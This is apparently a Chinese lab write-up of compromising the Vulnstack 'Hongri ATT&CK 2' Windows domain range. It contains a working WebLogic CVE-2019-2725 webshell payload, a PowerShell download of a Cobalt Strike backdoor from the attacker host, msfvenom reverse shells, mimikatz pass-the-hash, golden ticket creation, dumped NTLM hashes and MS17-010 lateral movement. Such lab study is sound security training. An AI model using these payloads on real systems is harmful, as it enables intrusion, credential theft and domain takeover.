---
title: 红日ATT&CK之二
tags:
  - 内网渗透
  - ATT&CK
  - 红日靶场
categories:
  - 内网渗透
description: 红日ATT&CK之二
excerpt: 红日ATT&CK之二
typora-root-url: 红日ATT-CK之二
abbrlink: 22116
date: 2022-04-10 16:01:44
---

## 红日ATT&CK 靶场二

> 下载地址：http://vulnstack.qiyuanxuetang.net/vuln/detail/3/
>
> 默认密码：1qaz@WSX

Web的服务器有点问题，直接登录Administrator，空密码，修改密码即可。

### 环境配置

内网网段：10.10.10.1/24

DMZ网段：192.168.111.1/24

测试机地址：192.168.111.1（Windows），192.168.111.11（Linux）

防火墙策略（策略设置过后，测试机只能访问192段地址，模拟公网访问）：

```
deny all tcp ports：10.10.10.1
allow all tcp ports：10.10.10.0/24
```

**DC**

IP：10.10.10.10 OS：Windows 2012(64)

应用：AD域

**WEB**

IP1：10.10.10.80 IP2：192.168.111.80(ACT: 192.168.111.130) OS：Windows 2008(64)

应用：Weblogic 10.3.6MSSQL 2008

**PC**

IP1：10.10.10.201 IP2：192.168.111.201(ACT: 192.168.111.129) OS：Windows 7(32)

应用：无

按照上述IP进行设置，如果建议192段地址直接使用DHCP获取IP即可。

进入Web机器，启动C盘下的Weblogic即可。

> 360的权限输入administrator以及密码即可。

###  外围打点

#### 信息收集

##### 端口信息

先用nmap扫描一下：

```bash
nmap -sC -sV -A -p- 192.168.111.130
```

东西不少：

```bash
Starting Nmap 7.91 ( https://nmap.org ) at 2022-04-10 21:29 EDT
Nmap scan report for 192.168.111.130
Host is up (0.00054s latency).
Not shown: 65522 filtered ports
PORT      STATE SERVICE            VERSION
80/tcp    open  http               Microsoft IIS httpd 7.5
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Site doesn't have a title.
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Windows Server 2008 R2 Standard 7601 Service Pack 1 microsoft-ds
1433/tcp  open  ms-sql-s           Microsoft SQL Server 2008 R2 10.50.4000.00; SP2
| ms-sql-ntlm-info:
|   Target_Name: DE1AY
|   NetBIOS_Domain_Name: DE1AY
|   NetBIOS_Computer_Name: WEB
|   DNS_Domain_Name: de1ay.com
|   DNS_Computer_Name: WEB.de1ay.com
|   DNS_Tree_Name: de1ay.com
|_  Product_Version: 6.1.7601
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2022-04-11T01:11:40
|_Not valid after:  2052-04-11T01:11:40
|_ssl-date: 2022-04-11T01:33:38+00:00; 0s from scanner time.
3389/tcp  open  ssl/ms-wbt-server?
| rdp-ntlm-info:
|   Target_Name: DE1AY
|   NetBIOS_Domain_Name: DE1AY
|   NetBIOS_Computer_Name: WEB
|   DNS_Domain_Name: de1ay.com
|   DNS_Computer_Name: WEB.de1ay.com
|   DNS_Tree_Name: de1ay.com
|   Product_Version: 6.1.7601
|_  System_Time: 2022-04-11T01:32:58+00:00
| ssl-cert: Subject: commonName=WEB.de1ay.com
| Not valid before: 2022-04-09T07:34:16
|_Not valid after:  2022-10-09T07:34:16
|_ssl-date: 2022-04-11T01:33:38+00:00; 0s from scanner time.
7001/tcp  open  http               Oracle WebLogic Server 10.3.6.0 (Servlet 2.5; JSP 2.1; T3 enabled)
|_http-title: Error 404--Not Found
|_weblogic-t3-info: T3 protocol in use (WebLogic version: 10.3.6.0)
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
58119/tcp open  msrpc              Microsoft Windows RPC
60966/tcp open  ms-sql-s           Microsoft SQL Server 2008 R2 10.50.4000; SP2
| ms-sql-ntlm-info:
|   Target_Name: DE1AY
|   NetBIOS_Domain_Name: DE1AY
|   NetBIOS_Computer_Name: WEB
|   DNS_Domain_Name: de1ay.com
|   DNS_Computer_Name: WEB.de1ay.com
|   DNS_Tree_Name: de1ay.com
|_  Product_Version: 6.1.7601
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2022-04-11T01:11:40
|_Not valid after:  2052-04-11T01:11:40
|_ssl-date: 2022-04-11T01:33:38+00:00; 0s from scanner time.
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -53m19s, deviation: 2h39m59s, median: 0s
| ms-sql-info:
|   192.168.111.130:1433:
|     Version:
|       name: Microsoft SQL Server 2008 R2 SP2
|       number: 10.50.4000.00
|       Product: Microsoft SQL Server 2008 R2
|       Service pack level: SP2
|       Post-SP patches applied: false
|_    TCP port: 1433
| smb-os-discovery:
|   OS: Windows Server 2008 R2 Standard 7601 Service Pack 1 (Windows Server 2008 R2 Standard 6.1)
|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
|   Computer name: WEB
|   NetBIOS computer name: WEB\x00
|   Domain name: de1ay.com
|   Forest name: de1ay.com
|   FQDN: WEB.de1ay.com
|_  System time: 2022-04-11T09:33:00+08:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2022-04-11T01:33:02
|_  start_date: 2022-04-11T01:10:53

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 239.88 seconds
```

##### nikto扫描

结果：

```bash
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.111.130
+ Target Hostname:    192.168.111.130
+ Target Port:        80
+ Start Time:         2022-04-10 21:40:43 (GMT-4)
---------------------------------------------------------------------------
+ Server: Microsoft-IIS/7.5
+ Retrieved x-powered-by header: ASP.NET
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Retrieved x-aspnet-version header: 2.0.50727
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST
+ Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ 7915 requests: 0 error(s) and 8 item(s) reported on remote host
+ End Time:           2022-04-10 21:41:02 (GMT-4) (19 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

然而Weblogic没扫出来啥结果：

```bash
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.111.130
+ Target Hostname:    192.168.111.130
+ Target Port:        7001
+ Start Time:         2022-04-10 21:42:17 (GMT-4)
---------------------------------------------------------------------------
+ Server: No banner retrieved
+ Retrieved x-powered-by header: Servlet/2.5 JSP/2.1
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ ERROR: Error limit (20) reached for host, giving up. Last error:
+ Scan terminated:  0 error(s) and 4 item(s) reported on remote host
+ End Time:           2022-04-10 21:42:17 (GMT-4) (0 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

##### 自行收集

接下来自己动手看看有没有什么信息还能收集一下的。

直接访问80端口，是一个空白页面。

直接dirb尝试了一下敏感文件、目录，结果：

```bash
-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Sun Apr 10 21:44:06 2022
URL_BASE: http://192.168.111.130/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://192.168.111.130/ ----
==> DIRECTORY: http://192.168.111.130/aspnet_client/

---- Entering directory: http://192.168.111.130/aspnet_client/ ----
==> DIRECTORY: http://192.168.111.130/aspnet_client/system_web/

---- Entering directory: http://192.168.111.130/aspnet_client/system_web/ ----

-----------------
END_TIME: Sun Apr 10 21:44:15 2022
DOWNLOADED: 13836 - FOUND: 0
```

那么看一下Weblogic。

```bash
-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Sun Apr 10 21:46:04 2022
URL_BASE: http://192.168.111.130:7001/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://192.168.111.130:7001/ ----
+ http://192.168.111.130:7001/console (CODE:200|SIZE:416)
==> DIRECTORY: http://192.168.111.130:7001/uddi/

---- Entering directory: http://192.168.111.130:7001/uddi/ ----
==> DIRECTORY: http://192.168.111.130:7001/uddi/images/

---- Entering directory: http://192.168.111.130:7001/uddi/images/ ----

-----------------
END_TIME: Sun Apr 10 21:46:39 2022
DOWNLOADED: 13836 - FOUND: 1
```

weblogic基本能确认了，看到/console路径的话。

#### Weblogic利用

由于80好像没有假设网站，Weblogic可以考虑利用一下。

访问其控制台页面可以看到版本号，直接exploit-db搜索一下：

```bash
┌──(kali㉿kali)-[~]
└─$ searchsploit "weblogic 10.3.6.0"                                                                                                                  2 ⨯
------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                          |  Path
------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Oracle Weblogic 10.3.6.0.0 - Remote Command Execution                                                                   | java/webapps/47895.py
Oracle Weblogic 10.3.6.0.0 / 12.1.3.0.0 - Remote Code Execution                                                         | windows/webapps/46780.py
Oracle WebLogic Server 10.3.6.0 - Java Deserialization Remote Code Execution                                            | java/remote/42806.py
Oracle Weblogic Server 10.3.6.0 / 12.1.3.0 / 12.2.1.2 / 12.2.1.3 - Deserialization Remote Command Execution             | multiple/remote/44553.py
Oracle WebLogic Server 10.3.6.0.0 / 12.x - Remote Command Execution                                                     | multiple/remote/43392.py
WebLogic Server 10.3.6.0.0 / 12.1.3.0.0 / 12.2.1.3.0 / 12.2.1.4.0 / 14.1.1.0.0 - Unauthenticated RCE via GET request    | java/webapps/48971.py
------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

打算直接利用，然后发现了：

![image-20220411101208817](./image-20220411101208817.png)

360YYDS。

经过测试CVE-2019-2725好像还是可以打的。

先利用一下CVE-2019-2725获取一下Weblogic目录：

```http
http://192.168.111.130:7001/_async/AsyncResponseService?info
```

可以得到回显：

```xml
<wsdlLocation=file:/C:/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/WEB-INF/AsyncResponseService.wsdl>
```

做到这里发现一个问题，VMWare的Kali居然上不了网。。。

重新建了一下网络，IP换了一下：

![image-20220411122657536](./image-20220411122657536.png)

Win7: 外网IP：192.168.140.129 内网IP：10.10.10.201

Web: 外网IP：192.168.140.130 内网IP：10.10.10.80

DC：内网IP：10.10.10.10

算了还算脚本小子一键吧：

> 工具地址：[black-mirror/Weblogic: Weblogic CVE-2019-2725 CVE-2019-2729 Getshell 命令执行 (github.com)](https://github.com/black-mirror/Weblogic)

这样会创建一个Webshell，然后利用这个webshell的话，本来想传一个哥斯拉马过去，但是好像没有必要，直接传了CS的后门，然后看一下能不能连。

```powershell
cmd=powershell%20(new-object%20Net.WebClient).DownloadFile(%27http://192.168.140.128/artifact.exe%27,%27C:\sys.exe%27)
```

然后再被360给拦了。。。

![image-20220411124414711](./image-20220411124414711.png)

你了不起，你清高。。。

直接写一下哥斯拉的马(目录之前已经是拿到了，在后面加?info即可)，试试：

```http
cmd=echo%20^<%!%20String%20xc="3c6e0b8a9c15224a";%20String%20pass="pass";%20String%20md5=md5(pass%2Bxc);%20class%20X%20extends%20ClassLoader{public%20X(ClassLoader%20z){super(z);}public%20Class%20Q(byte[]%20cb){return%20super.defineClass(cb,%200,%20cb.length);}%20}public%20byte[]%20x(byte[]%20s,boolean%20m){%20try{javax.crypto.Cipher%20c=javax.crypto.Cipher.getInstance("AES");c.init(m?1:2,new%20javax.crypto.spec.SecretKeySpec(xc.getBytes(),"AES"));return%20c.doFinal(s);%20}catch%20(Exception%20e){return%20null;%20}}%20public%20static%20String%20md5(String%20s)%20{String%20ret%20=%20null;try%20{java.security.MessageDigest%20m;m%20=%20java.security.MessageDigest.getInstance("MD5");m.update(s.getBytes(),%200,%20s.length());ret%20=%20new%20java.math.BigInteger(1,%20m.digest()).toString(16).toUpperCase();}%20catch%20(Exception%20e)%20{}return%20ret;%20}%20public%20static%20String%20base64Encode(byte[]%20bs)%20throws%20Exception%20{Class%20base64;String%20value%20=%20null;try%20{base64=Class.forName("java.util.Base64");Object%20Encoder%20=%20base64.getMethod("getEncoder",%20null).invoke(base64,%20null);value%20=%20(String)Encoder.getClass().getMethod("encodeToString",%20new%20Class[]%20{%20byte[].class%20}).invoke(Encoder,%20new%20Object[]%20{%20bs%20});}%20catch%20(Exception%20e)%20{try%20{%20base64=Class.forName("sun.misc.BASE64Encoder");%20Object%20Encoder%20=%20base64.newInstance();%20value%20=%20(String)Encoder.getClass().getMethod("encode",%20new%20Class[]%20{%20byte[].class%20}).invoke(Encoder,%20new%20Object[]%20{%20bs%20});}%20catch%20(Exception%20e2)%20{}}return%20value;%20}%20public%20static%20byte[]%20base64Decode(String%20bs)%20throws%20Exception%20{Class%20base64;byte[]%20value%20=%20null;try%20{base64=Class.forName("java.util.Base64");Object%20decoder%20=%20base64.getMethod("getDecoder",%20null).invoke(base64,%20null);value%20=%20(byte[])decoder.getClass().getMethod("decode",%20new%20Class[]%20{%20String.class%20}).invoke(decoder,%20new%20Object[]%20{%20bs%20});}%20catch%20(Exception%20e)%20{try%20{%20base64=Class.forName("sun.misc.BASE64Decoder");%20Object%20decoder%20=%20base64.newInstance();%20value%20=%20(byte[])decoder.getClass().getMethod("decodeBuffer",%20new%20Class[]%20{%20String.class%20}).invoke(decoder,%20new%20Object[]%20{%20bs%20});}%20catch%20(Exception%20e2)%20{}}return%20value;%20}%^>^<%try{byte[]%20data=base64Decode(request.getParameter(pass));data=x(data,%20false);if%20(session.getAttribute("payload")==null){session.setAttribute("payload",new%20X(this.getClass().getClassLoader()).Q(data));}else{request.setAttribute("parameters",data);java.io.ByteArrayOutputStream%20arrOut=new%20java.io.ByteArrayOutputStream();Object%20f=((Class)session.getAttribute("payload")).newInstance();f.equals(arrOut);f.equals(pageContext);response.getWriter().write(md5.substring(0,16));f.toString();response.getWriter().write(base64Encode(x(arrOut.toByteArray(),%20true)));response.getWriter().write(md5.substring(16));}%20}catch%20(Exception%20e){}%20%^>>C:/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/index000.jsp
```

注意转义一下`<`和`>`，还有URLEncode。

![image-20220411132357830](./image-20220411132357830.png)

上传CS后面：

![image-20220411132557738](./image-20220411132557738.png)

运行后：

![image-20220411132718582](./image-20220411132718582.png)

好，360你了不起。

没有关系，哥斯拉走一波PetitPotam：

![image-20220411134948282](./image-20220411134948282.png)

成功上线：

![image-20220411135049086](./image-20220411135049086.png)

### 内网渗透

#### 关闭防火墙以及360

注意前面我们端口扫描时，有发现开启了3389，这是远程桌面的端口，我们先连上去看看，由于是SYSTEM权限了，可以直接用mimikatz拿到明文密码：

![image-20220411105937158](./image-20220411105937158.png)

远程连接后可以发现，有360，我们先暂停360、再关防火墙。

#### 信息收集

信息收集看个人喜好，可以用CS也可以用MSF。

![image-20220411140830568](./image-20220411140830568.png)

net view只能拿到自己和域控服务器的IP。

可以看到存在de1ay域：

![image-20220411140918989](./image-20220411140918989.png)

确定域控是DC：

![image-20220411141123319](./image-20220411141123319.png)

然后发现了另一台机器：

![image-20220411141152808](./image-20220411141152808.png)

确定一下PC的IP是多少：

![image-20220411141459474](./image-20220411141459474.png)

到这里的话整个一个域的信息基本就已经确定了。

#### MSF MS17-010直接拿域控

会话派生给MSF。

定位域控后就可以尝试性访问一下域控：

![image-20220411115344741](./image-20220411115344741.png)

没法访问。

添加自动路由：

```bash
meterpreter > run post/multi/manage/autoroute
```

![image-20220411142142312](./image-20220411142142312.png)

然后用proxychains代理nmap扫描一波域控：

![image-20220411142340621](./image-20220411142340621.png)

```bash
proxychains nmap -sC -sV -A -p- 10.10.10.10
```

实际上在msf有了自动路由后用db_nmap一样的:

![image-20220411144945500](./image-20220411144945500.png)

这里的话，还可以使用MSF的端口扫描去做：

![image-20220411144422530](./image-20220411144422530.png)

当然使用CS去做也没有任何问题：

![image-20220411153703059](./image-20220411153703059.png)

这里的话可以看到开放的端口比较多，而且还开了445端口，用MSF嗅探一下。

![image-20220411153859925](./image-20220411153859925.png)

永恒之蓝打一下看看：

![image-20220411154033372](./image-20220411154033372.png)

然后直接直接拿下了域控。

#### 黄金票据攻击与MS17-010命令执行拿域控

尝试做一下黄金票据：

![image-20220411161452664](./image-20220411161452664.png)

居然读到了，那么直接创建黄金票据并且使用：

![image-20220411163324362](./image-20220411163324362.png)

![image-20220411163314625](./image-20220411163314625.png)

成功利用票据访问到dc的C盘：

![image-20220411163428373](./image-20220411163428373.png)

给他挂载一下：

![image-20220411163950481](./image-20220411163950481.png)

远程桌面就可以看到DC的一个文件情况：

![image-20220411164010538](./image-20220411164010538.png)

然后用MSF生成一个马，利用Web上传到dc上，接下来利用MS17-010的命令执行启动该程序、

```bash
┌──(kali㉿kali)-[~]
└─$ msfvenom -p windows/meterpreter/reverse_tcp lport=9999 lhost=10.10.10.80 -f exe > artifact.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes

meterpreter > upload /home/kali/artifact.exe C:/artifact.exe
[*] uploading  : /home/kali/artifact.exe -> C:/artifact.exe
[*] Uploaded 72.07 KiB of 72.07 KiB (100.0%): /home/kali/artifact.exe -> C:/artifact.exe
[*] uploaded   : /home/kali/artifact.exe -> C:/artifact.exe
meterpreter > shell
Process 2624 created.
Channel 4 created.
Microsoft Windows [�汾 6.1.7601]
��Ȩ���� (c) 2009 Microsoft Corporation����������Ȩ����

C:\Windows\system32>chcp 65001
chcp 65001
Active code page: 65001
C:\>copy artifact.exe Z:\
copy artifact.exe Z:\
        1 file(s) copied.
```

可以看到可以利用MS17-010进行命令执行，那么接下来我们执行一下我们的木马，并且使用MSF接受这个会话。

![image-20220411165013209](./image-20220411165013209.png)

直接拿到了shell：

![image-20220411170708893](./image-20220411170708893.png)

Hashdump如下：

```yml
Administrator:500:aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:82dfc71b72a11ef37d663047bc2088fb:::
de1ay:1001:aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24:::
mssql:2103:aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24:::
DC$:1002:aad3b435b51404eeaad3b435b51404ee:b3b182adbbec173e8e2997bb1308b189:::
PC$:1105:aad3b435b51404eeaad3b435b51404ee:80e99329949e6d78b20f91395ca12db5:::
WEB$:1603:aad3b435b51404eeaad3b435b51404ee:3bf43406dc9f6d0b924cc1ad2206496e:::
```

至于那台PC，还是老样子，利用MS17-010可以直接拿下，当然，用域控的黄金票据的话：

![image-20220411233318843](./image-20220411233318843.png)

这样再上传，利用sc 命令启动服务也可以。

> 事实证明SC是不行的。

#### 尝试PTH拿PC

思来想去，PC的360也不是摆设，试试利用CS拿下PC。

之前是已经拿下了域控，然后利用域控扫描一下内网段内的机器：

![image-20220413101554583](./image-20220413101554583.png)

然后尝试PTH并且上传后门进行攻击：

```bash
beacon> rev2self
[*] Tasked beacon to revert token
beacon> pth de1ay\Administrator 161cff084477fe596a5db81874498a24
[*] Tasked beacon to run mimikatz's sekurlsa::pth /user:Administrator /domain:de1ay /ntlm:161cff084477fe596a5db81874498a24 /run:"%COMSPEC% /c echo 222098cb4f2 > \\.\pipe\6c077a" command
beacon> jump psexec PC Jumper
[*] Tasked beacon to run windows/beacon_reverse_tcp (10.10.10.80:14234) on PC via Service Control Manager (\\PC\ADMIN$\710e349.exe)
[+] host called home, sent: 1036523 bytes
[+] Impersonated NT AUTHORITY\SYSTEM
[-] Could not start service 710e349 on PC: 299
[+] received output:
user    : Administrator
domain  : de1ay
program : C:\Windows\system32\cmd.exe /c echo 222098cb4f2 > \\.\pipe\6c077a
impers. : no
NTLM    : 161cff084477fe596a5db81874498a24
  |  PID  3656
  |  TID  3468
  |  LSA Process is now R/W
  |  LUID 0 ; 3662164 (00000000:0037e154)
  \_ msv1_0   - data copy @ 00000000019BF0C0 : OK !
  \_ kerberos - data copy @ 0000000000BF8D18
   \_ aes256_hmac       -> null
   \_ aes128_hmac       -> null
   \_ rc4_hmac_nt       OK
   \_ rc4_hmac_old      OK
   \_ rc4_md4           OK
   \_ rc4_hmac_nt_exp   OK
   \_ rc4_hmac_old_exp  OK
   \_ *Password replace @ 0000000000BD8588 (16) -> null
```

然后打开PC才发现：

![image-20220413105613647](./image-20220413105613647.png)

360YYDS。

再来一波MSF看看：

![image-20220413141159079](./image-20220413141159079.png)

然后：

![image-20220413141225205](./image-20220413141225205.png)

360真的是太强了。

#### 黄金票据上传木马执行拿PC

由于前面拿到了黄金票据，直接在CS中使用黄金票据拿PC时：

![image-20220413145232968](./image-20220413145232968.png)

和前面的一样，看来360是过不去了。。。

没有关系，上MSF手动开搞。

创建黄金票据并载入：

```bash
meterpreter > golden_ticket_create -u administrator -d de1ay.com -s S-1-5-21-2756371121-2868759905-3
853650604-502 -k 82dfc71b72a11ef37d663047bc2088fb -t /home/kali/gold.ticket
[+] Golden Kerberos ticket written to /home/kali/gold.ticket
meterpreter > kerberos_ticket_use /home/kali/gold.ticket
[*] Using Kerberos ticket stored in /home/kali/gold.ticket, 1840 bytes ...
[+] Kerberos ticket applied successfully.
```

> 所以后面的502到底是要还是不要呢？前面也试过不要502的，也可以，要也可以。

创建一个映射：

```bash
C:\Oracle\Middleware\user_projects\domains\base_domain>net use X: \\pc\c$
net use X: \\pc\c$
The command completed successfully.
```

![image-20220413152652119](./image-20220413152652119.png)

显示会有一个×，没有关系，我们继续用就好了。

然后传MSF木马：

```bash
meterpreter > upload /home/kali/msf.exe X://msf.exe
[*] uploading  : /home/kali/msf.exe -> X://msf.exe
[*] Uploaded 7.00 KiB of 7.00 KiB (100.0%): /home/kali/msf.exe -> X://msf.exe
[*] uploaded   : /home/kali/msf.exe -> X://msf.exe
```

接下来就是怎么去执行木马的问题了。

> 而且这样传不会弹360 -,-

先试了一下创建一个服务：

```bash
C:\Oracle\Middleware\user_projects\domains\base_domain>sc \\10.10.10.201 create bdtttttt binpath="C:\\msf.exe"
sc \\10.10.10.201 create bdtttttt binpath="C:\\msf.exe"
[SC] OpenSCManager FAILED 5:

Access is denied.
```

没有办法成功。

建立IPC连接：

```bash
C:\Oracle\Middleware\user_projects\domains\base_domain>net use \\pc\ipc$
net use \\pc\ipc$
The command completed successfully.

```

居然成功了，定时任务执行：

```bash
C:\Oracle\Middleware\user_projects\domains\base_domain>at \\pc 15:23:00 cmd.exe /c "start C:\\msf.exe"
at \\pc 15:23:00 cmd.exe /c "start C:\\msf.exe"
Added a new job with job ID = 1
```

![image-20220413153046204](./image-20220413153046204.png)

![image-20220413154200456](./image-20220413154200456.png)

拿下。

